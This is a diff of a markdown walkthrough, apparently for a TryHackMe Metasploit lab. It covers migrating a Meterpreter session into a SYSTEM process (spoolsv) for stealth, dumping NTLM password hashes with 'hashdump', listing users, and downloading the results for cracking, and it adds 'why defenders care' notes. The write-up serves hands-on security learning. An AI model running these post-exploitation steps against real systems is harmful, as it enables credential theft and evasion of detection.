@@ -101,6 +101,7 @@ To use just type:
 	
 ## Q2: The next question is the see what options need to be filled. That is just show options.
 4 options appear one for answer is 7 characters so:
+
 Answer: session
 	
 ## Q3: find relevant session to use the POST module to upgrade it, no response required.
@@ -220,107 +221,104 @@ Why defenders care: Long‑running processes hide persistence better and blend i
 If the attacker is SYSTEM, they need a SYSTEM process. If they are a user, they need a user‑level process. Why defenders care: Privilege mismatches are a detection signal.
 	
 ### Have consistent CPU/memory usage
-	Processes that spike or behave oddly stand out in EDR logs.
-	Why defenders care: Injected code often changes a process’s behavior profile.
+- Processes that spike or behave oddly stand out in EDR logs.
+- Why defenders care: Injected code often changes a process’s behavior profile.
 	
 ### Are not protected or hardened
-	Some processes are dangerous to touch:
-		- AV/EDR processes
-		- LSASS
-		- Winlogon
-		- CSRSS
-	Why defenders care: Tampering with these is a high‑confidence alert.
+Some processes are dangerous to touch:
+	- AV/EDR processes
+	- LSASS
+	- Winlogon
+	- CSRSS
+Why defenders care: Tampering with these is a high‑confidence alert.
+
+Conceptually, attackers choose processes that:
+	- Have network access
+	- Use similar protocols (e.g., HTTP/S)
+	- Already talk to the internet
+	- Won’t look suspicious making outbound connections
+Why defenders care: Outbound traffic from unusual processes is a classic IOC.
 	
-	Match the attacker’s infrastructure
-	This is the part you asked about.
-	Conceptually, attackers choose processes that:
-		- Have network access
-		- Use similar protocols (e.g., HTTP/S)
-		- Already talk to the internet
-		- Won’t look suspicious making outbound connections
-	Why defenders care: Outbound traffic from unusual processes is a classic IOC.
-	
-	Now to get to more stable process we need to check processes available first:
+Now to get to more stable process we need to check processes available first:
 ```
-  meterpreter > ps
+meterpreter > ps
 	
-	Process List
-	============
+Process List
+============
 	
-	 PID    PPID  Name        Arch  Session  User             Path
-	 ---    ----  ----        ----  -------  ----             ----
-	 0      0     [System Pr
-	              ocess]
-	 4      0     System      x64   0
-	 396    664   LogonUI.ex  x64   1        NT AUTHORITY\SY  C:\Windows\syst
-	              e                          STEM             em32\LogonUI.ex
+ PID    PPID  Name        Arch  Session  User             Path
+ ---    ----  ----        ----  -------  ----             ----
+ 0      0     [System Pr
+              ocess]
+ 4      0     System      x64   0
+396    664   LogonUI.ex  x64   1        NT AUTHORITY\SY  C:\Windows\syst
+              e                          STEM             em32\LogonUI.ex
 	                                                          e
-	…
-	9768   712   spoolsv.ex  x64   0        NT AUTHORITY\SY  C:\Windows\Syst
+…
+9768   712   spoolsv.ex  x64   0        NT AUTHORITY\SY  C:\Windows\Syst
 	              e                          STEM             em32\spoolsv.ex
 ```	
 	
 Its present alternatively use grep if service to migrate to is known:
 ```
-	meterpreter > ps | grep spool
-	Filtering on 'spool'
+meterpreter > ps | grep spool
+Filtering on 'spool'
 	
-	Process List
-	============
+Process List
+============
 	
-	 PID   PPID  Name        Arch  Session  User            Path
-	 ---   ----  ----        ----  -------  ----            ----
-	 1336  716   spoolsv.ex  x64   0        NT AUTHORITY\S  C:\Windows\Syst
-	             e                          YSTEM           em32\spoolsv.ex
-	                                                        e
+ PID   PPID  Name        Arch  Session  User            		Path
+ ---   ----  ----        ----  -------  ----            		----
+ 1336  716   spoolsv.exe  x64   0        NT AUTHORITY\SYSTEM   C:\Windows\System32\spoolsv.exe	 
+                                                                                           
 	
-	meterpreter > migrate 1336
-	[*] Migrating from 816 to 1336...
-	[*] Migration completed successfully.
-	meterpreter > 
+meterpreter > migrate 1336
+[*] Migrating from 816 to 1336...
+[*] Migration completed successfully.
+meterpreter > 
 ```
 
 # Task 4: Cracking
 
 ## Q1: What is the name of the non-default user? 
 ```	
-	meterpreter > hashdump
-	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-	Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-	Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
-	meterpreter >
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter >
 ```	
-	Note downloading the hashes from meterpreter did not work using. Failed with no form of error:
+Note downloading the hashes from meterpreter did not work using. Failed with no form of error:
 	
 Answer: jon
 
 
 ## Try to download the file of hashes but for some reason it failed: This appears to be a fault of TryHackMe everything should have worked I am not sure why.
 ```
-	meterpreter > hashdump > hashes.txt
-	meterpreter > download C:\\Windows\\Temp\\hashes.txt /home/kali/Desktop/
+meterpreter > hashdump > hashes.txt
+meterpreter > download C:\\Windows\\Temp\\hashes.txt /home/kali/Desktop/
 ```
 	
 ### download command does appear to work:
 ```	
-	C:\Windows\system32>net users > C:\Tempnetusers.txt
-	net users > C:\Tempnetusers.txt
+C:\Windows\system32>net users > C:\Tempnetusers.txt
+net users > C:\Tempnetusers.txt
 ```	
 ### Type the Windows cat equivalent:
-```	
-	C:\Windows\system32>type C:\Tempnetusers.txt
-	type C:\Tempnetusers.txt
+```
+C:\Windows\system32>type C:\Tempnetusers.txt
+type C:\Tempnetusers.txt
 	
-	User accounts for \\
+User accounts for \\
 	
-	-------------------------------------------------------------------------------
-	Administrator            Guest                    Jon                      
-	The command completed with one or more errors.
+-------------------------------------------------------------------------------
+Administrator            Guest                    Jon                      
+The command completed with one or more errors.
 	
-	C:\Windows\system32>
+C:\Windows\system32>
 	
-	C:\Windows\system32>^Z
-	Background channel 1? [y/N]  y
+C:\Windows\system32>^Z
+Background channel 1? [y/N]  y
 ```
 	
 ### Download the file using download and works as expected.
@@ -341,7 +339,9 @@ Desktop     Postman	  thinclient_drives
 Downloads   Rooms	  Tools    
 Scripts
 ```
+
 Downloaded file Tempnetusers present not Hash.txt 
+
 ```
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -415,7 +415,6 @@ drwxr-xr-x  2 root root 4096 Aug 14  2020 .
 drwxrwxrwx 13 root root 4096 Mar 28 04:54 ..
 root@ip-10-66-120-76:~/.msf4# 
 ```
-
 
 This does not change anything we just go back to copy into nano and crack the passwords collected in next question.
 
